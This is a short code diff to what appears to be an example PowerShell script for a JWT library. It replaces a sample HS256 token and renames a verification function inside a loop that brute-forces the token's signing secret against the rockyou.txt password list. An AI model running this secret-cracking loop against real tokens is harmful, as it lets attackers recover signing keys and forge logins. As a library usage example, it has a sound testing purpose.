@@ -92,7 +92,7 @@ $signedJwt = "{0}.{1}" -f $jwtSansSig, $signature
 
 
 # Brute force an HMAC-SHA256 JWT
-$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYwNjQ0NzIsIm5iZiI6MTYwNjA2NDQ3MiwiZXhwIjoxNjA2MDY0NzcyLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.VFKBN8RI0uch0TjtUwrj6MG_StImW3eBdkOqLkTQwfA"
+$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYxNDEwOTMsIm5iZiI6MTYwNjE0MTA5MywiZXhwIjoxNjA2MTQxMzkzLCJqdGkiOiI1Njk5YTBlYTk3YzM0Yzc2OTlkZGZlNzNmNTIzOTI1MiIsInN1YiI6InVzZXJuYW1lQGNvbXBhbnkuY29tIn0.Ej86QALzH37R1zB7QhwwYdFjXL1UhG2E3n6nezEYONY"
 
 $wordListFilePath = "./rockyou.txt"
 $wordList = [System.IO.File]::ReadAllLines($wordListFilePath)
@@ -101,7 +101,7 @@ foreach ($secret in $wordList)
 {
     if ($secret.Trim().Length -ge 1)
     {
-        [bool]$cracked = Test-JsonWebToken -JsonWebToken $jwt -Key $secret.Trim() -HashAlgorithm SHA256    
+        [bool]$cracked = Test-JwtSignature -JsonWebToken $jwt -Key $secret.Trim() -HashAlgorithm SHA256
         if ($cracked)
         {
             $outputMessage = "Secret was: {0}" -f $secret
